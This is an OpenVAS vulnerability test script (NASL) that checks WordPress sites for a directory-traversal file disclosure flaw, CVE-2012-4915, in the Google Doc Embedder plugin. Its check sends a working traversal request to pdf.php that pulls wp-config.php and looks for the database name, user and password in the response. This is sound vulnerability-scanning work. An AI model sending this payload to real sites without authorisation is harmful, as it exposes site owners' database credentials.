###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wordpress_57133.nasl 13994 2019-03-05 12:23:37Z cfischer $
#
# WordPress Google Doc Embedder Plugin Arbitrary File Disclosure Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103637");
  script_bugtraq_id(57133);
  script_cve_id("CVE-2012-4915");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_version("$Revision: 13994 $");

  script_name("WordPress Google Doc Embedder Plugin Arbitrary File Disclosure Vulnerability");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/57133");
  script_xref(name:"URL", value:"http://www.wordpress.org/");

  script_tag(name:"last_modification", value:"$Date: 2019-03-05 13:23:37 +0100 (Tue, 05 Mar 2019) $");
  script_tag(name:"creation_date", value:"2013-01-08 14:00:15 +0100 (Tue, 08 Jan 2013)");

  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2013 Greenbone Networks GmbH");
  script_dependencies("secpod_wordpress_detect_900182.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("wordpress/installed");

  script_tag(name:"solution", value:"Vendor updates are available. Please see the references for more
  information.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"summary", value:"The Google Doc Embedder Plugin for WordPress is prone to an arbitrary
  file-disclosure vulnerability because it fails to properly sanitize user-supplied input.");

  script_tag(name:"impact", value:"A remote attacker can use directory-traversal sequences to retrieve
  arbitrary files in the context of the affected application.");

  script_tag(name:"affected", value:"Google Doc Embedder 2.4.6 is vulnerable, other versions may also be affected.");

  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
include("misc_func.inc");

if(!port = get_app_port(cpe:CPE))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if (dir == "/")
  dir = "";

vtstrings = get_vt_strings();
filename = vtstrings["lowercase_rand"] + '.pdf';

url = dir + '/wp-content/plugins/google-document-embedder/libs/pdf.php?fn=' + filename  + '&file=../../../../wp-config.php';
if(http_vuln_check(port:port, url:url,pattern:"DB_NAME",extra_check:make_list("DB_USER","DB_PASSWORD","DB_HOST"))) {
  report = report_vuln_url(port:port, url:url);
  security_message(port:port, data:report);
  exit(0);
}

exit(99);